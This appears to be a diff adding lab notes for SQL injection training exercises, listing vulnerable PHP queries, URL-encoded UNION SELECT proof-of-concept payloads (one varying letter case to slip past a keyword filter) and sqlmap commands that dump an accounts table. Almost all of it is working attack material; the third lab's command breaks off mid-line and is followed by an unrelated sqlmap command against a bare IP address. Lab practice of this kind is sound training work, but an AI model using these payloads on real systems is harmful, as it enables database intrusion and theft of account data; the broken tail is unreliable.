@@ -1,0 +1,64 @@
+#
+# 1 - ENTRY LEVEL
+# 
+# Query:
+#	$query = "SELECT views from attachments where filename='$filename'";
+
+
+# PoC
+http://hacker.site/2nd/view.php?payload=%27%20union%20select%20@@version;%20--%20-
+
+# SQLMAP
+./sqlmap.py -u 'http://hacker.site/2nd/view.php?payload=a' \
+	--technique=U --suffix='; -- -' --banner
+	
+./sqlmap.py -u 'http://hacker.site/2nd/view.php?payload=a' \
+	--technique=U --suffix='; -- -' -D selfie4you01 -T accounts --dump --no-cast
+
+
+#
+# 2 - UNION SELECT
+#		* no filters
+# 
+# Filters:
+#	
+# Query:
+#	$query = "SELECT views FROM attachments where filename='$entry';";
+#
+
+# PoC
+http://hacker.site/2nd/upload.php?lab=2&payload='+union+select+@@version;%23
+
+# SQLMAP
+./sqlmap.py -u "http://hacker.site/2nd/upload.php?lab=2&payload=_" \
+	-p payload --technique=U --suffix=';#' --union-col=1 --dbms MySQL \
+	--banner --no-cast
+	
+./sqlmap.py -u "http://hacker.site/2nd/upload.php?lab=2&payload=_" \
+	-p payload --technique=U --suffix=';#' --union-col=1 --dbms MySQL \
+	-D selfie4you02 -T accounts --dump --no-cast
+
+
+---------------------------------------------------------------------------------------
+
+#
+# 3 - UNION SELECT 
+#		* randomcase filter
+# 		* union-char it's not required here
+# 
+# Filters:
+#	/UNION/
+#	/SELECT/
+#
+# Query:
+#	$query = "SELECT views FROM attachments where filename='$entry';";
+#
+
+# PoC
+http://hacker.site/2nd/upload.php?lab=3&payload=a%27%20UNIoN%20SeLECT%20%27PoC%20String%27;%20--%20-
+
+# SQLMAP
+
+./sqlmap.py -u 'http://hacker.site/2nd/upload.php?lab=3
+
+sqlmap -u 'http://192.222.62.2/upload.php?lab=4&payload=' -p payload --technique=B --dbms MySQL --no-cast --tamper=symboliclogical --threads=10 --banner --flush-session --regexp='99\sviews'  --prefix="01.jpg'"
